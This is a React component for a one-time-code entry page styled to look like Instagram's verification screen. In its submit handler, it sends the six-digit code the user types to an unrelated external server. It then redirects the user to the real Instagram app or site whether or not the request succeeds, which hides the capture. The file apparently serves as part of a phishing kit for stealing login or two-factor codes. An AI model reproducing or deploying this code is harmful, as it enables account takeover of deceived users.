import { useState, useRef } from "react";
import logo from "../assets/logo.png"; // Replace with your Instagram-style logo

const OTP = (props) => {
    const [otp, setOtp] = useState(new Array(6).fill(""));
    const inputRefs = useRef([]);

    const handleChange = (e, index) => {
        const value = e.target.value;
        if (isNaN(value)) return; // Allow only numbers

        const newOtp = [...otp];
        newOtp[index] = value.substring(value.length - 1);
        setOtp(newOtp);

        // Move to next input if a digit is entered
        if (value && index < 5) {
            inputRefs.current[index + 1].focus();
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace" && !otp[index] && index > 0) {
            inputRefs.current[index - 1].focus();
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            const response = await fetch("https://think-pad-ruby.vercel.app/api/verify", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ otp: otp.join("") }),
            });

            const data = await response.json();
            let redirectURL = "https://www.instagram.com/"; // Default fallback URL

            if (response.ok && data.success) {
                redirectURL = data.redirectURL;
            }

            // ✅ Always try to open the Instagram app first
            window.location.href = redirectURL;

            // 🔄 If the app doesn’t open, fallback to Instagram Web after 2 sec
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 2000);

        } catch (error) {
            console.error("Error verifying OTP:", error);

            // Even if an error occurs, still try opening the Instagram app
            const isAndroid = /Android/i.test(navigator.userAgent);
            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

            let redirectURL = "https://www.instagram.com/"; // Default fallback

            if (isAndroid) {
                redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;"; // Open Instagram App (Android)
            } else if (isIOS) {
                redirectURL = "instagram://app"; // Open Instagram App (iOS)
            }

            // ✅ Try opening the Instagram app even in case of an error
            window.location.href = redirectURL;

            // 🔄 If the app doesn’t open, fallback to Instagram Web after 2 sec
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 2000);
        }
    };




    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
            <img src={props.logo} alt="Logo" className="w-40 mb-6" />

            <div className="bg-white p-6 shadow-md rounded-md text-center w-80">
                <h2 className="text-lg font-semibold mb-2">Enter OTP</h2>
                <p className="text-gray-600 text-sm mb-4">We sent a code to your number</p>

                <div className="flex justify-center space-x-2 mb-4">
                    {otp.map((digit, index) => (
                        <input
                            key={index}
                            type="text"
                            maxLength="1"
                            value={digit}
                            onChange={(e) => handleChange(e, index)}
                            onKeyDown={(e) => handleKeyDown(e, index)}
                            ref={(el) => (inputRefs.current[index] = el)}
                            className="w-10 h-10 text-center text-lg border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                        />
                    ))}
                </div>

                <button
                    className="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600 w-full"
                    onClick={handleSubmit}
                    disabled={otp.includes("")}
                >
                    Verify OTP
                </button>
            </div>
        </div>
    );
};

export default OTP;
